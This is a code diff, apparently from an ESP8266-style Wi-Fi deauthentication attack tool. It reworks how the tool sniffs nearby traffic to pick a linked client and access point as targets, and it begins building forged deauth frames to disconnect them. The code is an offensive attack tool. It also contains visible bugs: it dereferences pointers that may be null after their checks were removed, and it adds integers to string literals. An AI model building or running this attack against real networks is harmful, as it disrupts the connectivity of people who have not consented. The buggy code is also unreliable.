@@ -9,57 +9,7 @@ String getVendor(const uint8_t* mac) {
         return "LAA";
     }
 
-    if ((mac[0] == 0xD8 && mac[1] == 0xA2 && mac[2] == 0x5E) ||  // Apple
-        (mac[0] == 0xF4 && mac[1] == 0xF1 && mac[2] == 0x5A) || 
-        (mac[0] == 0x88 && mac[1] == 0xE9 && mac[2] == 0xFE)) {
-        return "Apple";
-    }
-
-    if ((mac[0] == 0xFC && mac[1] == 0x19 && mac[2] == 0x10) ||  // Samsung
-        (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x6C) || 
-        (mac[0] == 0x5C && mac[1] == 0x49 && mac[2] == 0x79)) {
-        return "Samsung";
-    }
-
-    if ((mac[0] == 0x18 && mac[1] == 0x82 && mac[2] == 0x8C) ||  // Xiaomi
-        (mac[0] == 0x60 && mac[1] == 0x21 && mac[2] == 0xC0) || 
-        (mac[0] == 0x64 && mac[1] == 0x09 && mac[2] == 0x80)) {
-        return "Xiaomi";
-    }
-
-    if ((mac[0] == 0x00 && mac[1] == 0x40 && mac[2] == 0x96) ||  // Cisco
-        (mac[0] == 0xC0 && mac[1] == 0xFF && mac[2] == 0xEE) || 
-        (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x54)) {
-        return "Cisco";
-    }
-
-    if ((mac[0] == 0xF4 && mac[1] == 0x8C && mac[2] == 0x50) ||  // Huawei
-        (mac[0] == 0xA0 && mac[1] == 0x57 && mac[2] == 0xE3) || 
-        (mac[0] == 0xD4 && mac[1] == 0xF4 && mac[2] == 0x6F)) {
-        return "Huawei";
-    }
-
-    if ((mac[0] == 0x00 && mac[1] == 0x13 && mac[2] == 0xE8) ||  // Intel
-        (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x21) || 
-        (mac[0] == 0x3C && mac[1] == 0x77 && mac[2] == 0xE6)) {
-        return "Intel";
-    }
-
-    if ((mac[0] == 0x04 && mac[1] == 0x92 && mac[2] == 0x26) ||  // ASUS
-        (mac[0] == 0xAC && mac[1] == 0x9E && mac[2] == 0x17)) {
-        return "ASUS";
-    }
-
-    if ((mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x75) ||  // LG
-        (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0xE2)) {
-        return "LG";
-    }
-
-    if ((mac[0] == 0xF4 && mac[1] == 0xF2 && mac[2] == 0x6D) ||  // TP-Link
-        (mac[0] == 0xE8 && mac[1] == 0x94 && mac[2] == 0xF6) || 
-        (mac[0] == 0x30 && mac[1] == 0xB5 && mac[2] == 0xC2)) {
-        return "TP-Link";
-    }
+    // Read from SD through SPI
 
     return "Unknown";
 }
@@ -99,17 +49,6 @@ ClientInfo* DeauthDisplay::findClientByMac(uint8_t* addr) {
     return rtnVal;
 }
 
-void DeauthDisplay::handleBeacon(uint8_t* APMac) {
-    ClientInfo* client = findClientByMac(APMac);
-
-    if (client != nullptr) {
-        client->packetCount++;
-        client->lastSeenMillis = millis();
-        client->beaconCount++;
-        client->direction = Direction::FROM_AP;
-        client->isAP = true;
-    }
-}
 void DeauthDisplay::handleProbeReq(uint8_t* clientMac) {
     ClientInfo* client = findClientByMac(clientMac);
 
@@ -120,57 +59,51 @@ void DeauthDisplay::handleProbeReq(uint8_t* clientMac) {
         client->direction = Direction::TO_AP;
     }
 }
-void DeauthDisplay::handleProbeRes(uint8_t* clientMac, uint8_t* APMac) {
-    ClientInfo* client = findClientByMac(clientMac);
-
-    if (client != nullptr) {
-        client->packetCount++;
-        client->lastSeenMillis = millis();
-        client->probeResCount++;
-        client->direction = Direction::TO_AP;
-    }
-
-    client = findClientByMac(APMac);
-
-    if (client != nullptr) {
-        client->packetCount++;
-        client->lastSeenMillis = millis();
-        client->probeResCount++;
-        client->direction = Direction::FROM_AP;
-    }
-}
-void DeauthDisplay::handleData(uint8_t* receiverMac, uint8_t* transmitterMac, uint8_t* APMac) {
+void DeauthDisplay::handleData(uint8_t* receiverMac, uint8_t* transmitterMac, uint8_t* APMac, uint8_t toDS, uint8_t fromDS) {
     ClientInfo* receiver = findClientByMac(receiverMac);
     ClientInfo* transmitter = findClientByMac(transmitterMac);
 
-    if (receiver != nullptr) {
-        receiver->packetCount++;
-        receiver->lastSeenMillis = millis();
-        receiver->dataCount++;
+    // Update counts and timestamps first (common to all cases)
+    receiver->packetCount++;
+    receiver->lastSeenMillis = millis();
+    receiver->dataCount++;
+
+    transmitter->packetCount++;
+    transmitter->lastSeenMillis = millis();
+    transmitter->dataCount++;
+
+    // Handle based on ToDS/FromDS flags
+    if (toDS == 1 && fromDS == 0) {
+        // Client -> AP
         receiver->direction = Direction::TO_AP;
+        transmitter->direction = Direction::FROM_AP;
 
         if (memcmp(receiverMac, APMac, 6) == 0) {
             receiver->isAP = true;
-        } else if (memcmp(transmitterMac, APMac, 6) == 0) {
-            memcpy(receiver->linkedAP, transmitter->mac, 6);
-            receiver->isLinked = true;
-            Serial.println("Someone linked!");
         }
-    }
-
-    if (transmitter != nullptr) {
-        transmitter->packetCount++;
-        transmitter->lastSeenMillis = millis();
-        transmitter->dataCount++;
+        if (memcmp(transmitterMac, APMac, 6) == 0) {
+            transmitter->isAP = true;
+        } else {
+            memcpy(transmitter->linkedAP, receiverMac, 6);
+            transmitter->isLinked = true;
+        }
+    } else if (toDS == 0 && fromDS == 1) {
+        // AP -> Client
+        receiver->direction = Direction::TO_AP;
         transmitter->direction = Direction::FROM_AP;
 
         if (memcmp(transmitterMac, APMac, 6) == 0) {
             transmitter->isAP = true;
-        } else if (memcmp(receiverMac, APMac, 6) == 0) {
-            memcpy(transmitter->linkedAP, receiver->mac, 6);
-            transmitter->isLinked = true;
-            Serial.println("Someone linked!");
         }
+        if (memcmp(receiverMac, APMac, 6) == 0) {
+            receiver->isAP = true;
+        } else {
+            memcpy(receiver->linkedAP, transmitterMac, 6);
+            receiver->isLinked = true;
+        }
+    } else {
+        receiver->direction = Direction::UNKNOWN;
+        transmitter->direction = Direction::UNKNOWN;
     }
 }
 
@@ -194,14 +127,12 @@ void DeauthDisplay::snifferCallback(uint8_t *buf, uint16_t len) {
     uint8_t* addr2 = frame + 10;
     uint8_t* addr3 = frame + 16;
 
-    if (type == 0 && subtype == 8 && !isJunkMac(addr2) && !isJunkMac(addr3)) { // Beacon
-        instance->handleBeacon(addr2);
-    } else if (type == 0 && subtype == 4 && !isJunkMac(addr2)) { // Probe Req
+    if (type == 0 && subtype == 4 && !isJunkMac(addr2)) { // Probe Req
         instance->handleProbeReq(addr2);
-    } else if (type == 0 && subtype == 5 && !isJunkMac(addr1) && !isJunkMac(addr2) && !isJunkMac(addr3)) {// Probe Resp
-        instance->handleProbeRes(addr1, addr2);
-    } else if (type == 2 && subtype != 4 && subtype != 5 && subtype != 6 && subtype != 7 && subtype != 12 && !isJunkMac(addr1) && !isJunkMac(addr2) && !isJunkMac(addr3)) { // Data
-        instance->handleData(addr1, addr2, addr3);
+    } else if (type == 2 && !isJunkMac(addr1) && !isJunkMac(addr2) && !isJunkMac(addr3)) { // Data
+        uint8_t toDS = (frameCtrl & 0x0100) >> 8;
+        uint8_t fromDS = (frameCtrl & 0x0200) >> 9;
+        instance->handleData(addr1, addr2, addr3, toDS, fromDS);
     }
 }
 
@@ -260,10 +191,10 @@ bool DeauthDisplay::scanInputs() {
 
             currStage = AttackStage::DEAUTHING;
 
-            // Disable promiscuous mode
-            wifi_promiscuous_enable(false);
+            Serial.println("setting currstage");
         } else {
             // Toggle deauth attack
+            Serial.println("toggle attackToggle");
             attackToggle = !attackToggle;
         }
         buttonPressed = true;
@@ -338,26 +269,19 @@ void DeauthDisplay::displayScreen() {
         display.println(String(index + 1) + "/" + String(clientIndex + 1) + ") :" + macStr + (clients[index].isAP ? "(AP)" : ""));
         display.println("Vendor: " + getVendor(&clients[index].mac[0]));
 
-        display.println("Last Seen ");
-        display.println("Bcn |Prq |Prs |Dat ");
-
-        char countsStr[32];
-        sprintf(countsStr, "%4d|%4d|%4d|%4d", 
-            clients[index].beaconCount, 
-            clients[index].probeReqCount, 
-            clients[index].probeResCount, 
-            clients[index].dataCount);
-        display.println(countsStr);
+        display.println("Last seen "  + String((millis() - clients[index].lastSeenMillis) / 1000) + "s ago");
+        display.println("Probe Reqs: " + clients[index].probeReqCount);
+        display.println("Data: " + clients[index].dataCount);
         
-        display.println(clients[index].direction == Direction::UNKOWN ? "UNKNOWN" : clients[index].direction == Direction::FROM_AP ? "FROM AP" : "TO AP");
+        display.println(clients[index].direction == Direction::UNKNOWN ? "UNKNOWN" : clients[index].direction == Direction::FROM_AP ? "FROM AP" : "TO AP");
 
         display.println(clients[index].isLinked ? "LINKED & READY" : "NOT LINKED");
     } else {
         char macStr[9];
-        sprintf(macStr, "%02X:%02X:%02X", clients[index].mac[3], clients[index].mac[4], clients[index].mac[5]);
+        sprintf(macStr, "%02X:%02X:%02X", targetClientMAC[3], targetClientMAC[4], targetClientMAC[5]);
         display.println("Target:");
         display.println(macStr);
-        sprintf(macStr, "%02X:%02X:%02X", clients[index].mac[3], clients[index].mac[4], clients[index].mac[5]);
+        sprintf(macStr, "%02X:%02X:%02X", targetAPMAC[3], targetAPMAC[4], targetAPMAC[5]);
         display.println("AP:");
         display.println(macStr);
         display.println("Packets sent: " + String(deauthPacketsSent));
@@ -371,6 +295,7 @@ void DeauthDisplay::displayScreen() {
 
 void DeauthDisplay::attack() {
     if (attackToggle && currStage == AttackStage::DEAUTHING) {
+        Serial.println("Attack running!");
         uint8_t packet[26] = {
             0xC0, 0x00, // Type: deauth (0xC0), Flags: 0x00
             0x00, 0x00, // Duration
